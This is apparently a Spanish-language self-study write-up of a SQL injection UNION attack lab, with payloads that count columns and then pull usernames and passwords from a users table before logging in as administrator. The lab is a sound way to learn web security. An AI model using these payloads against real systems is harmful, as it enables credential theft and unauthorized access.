---
title: "10 - SQL injection UNION attack, retrieving data from other tables"
date: 2026-08-27
tags:
  - self-study
  - security-penetration-testing
  - avanzado
status: verified
author: "Juan José Restrepo Rosero"
last_updated: 2026-08-27
---

Tenemos el siguiente laboratorio:
![[Pasted image 20240517153631.png]]
Si entramos en alguna de las categorías, se marca en la url:
![[Pasted image 20240517153728.png]]
Insertamos el siguiente payload y vemos que hay 2 columnas:
```bash
category=Accessories'+UNION+SELECT+'abc','def'--
```
![[Pasted image 20240517153958.png]]
Ahora para conocer el contenido de las columnas username y password de la tabla users, usamos la siguiente query:
```bash
Accessories'+UNION+SELECT+username,+password+FROM+users--
```
![[Pasted image 20240517154105.png]]
Nos logueamos con la contraseña del usuario administrador y ya estamos dentro:
![[Pasted image 20240517154508.png]]

<!-- self-study-knowledge-context -->
## Contexto de estudio
- Dominio: [[MOC-Self-Study#Security & Penetration Testing|Seguridad y pruebas de penetración]].
- Criterio de producción: Ejecuta técnicas únicamente en activos propios o con autorización explícita, alcance documentado y controles de no afectación.
> [!warning] Uso autorizado
> Este material es exclusivamente educativo y defensivo. Practica en laboratorios aislados, CTFs o sistemas para los que dispongas de autorización previa y explícita.
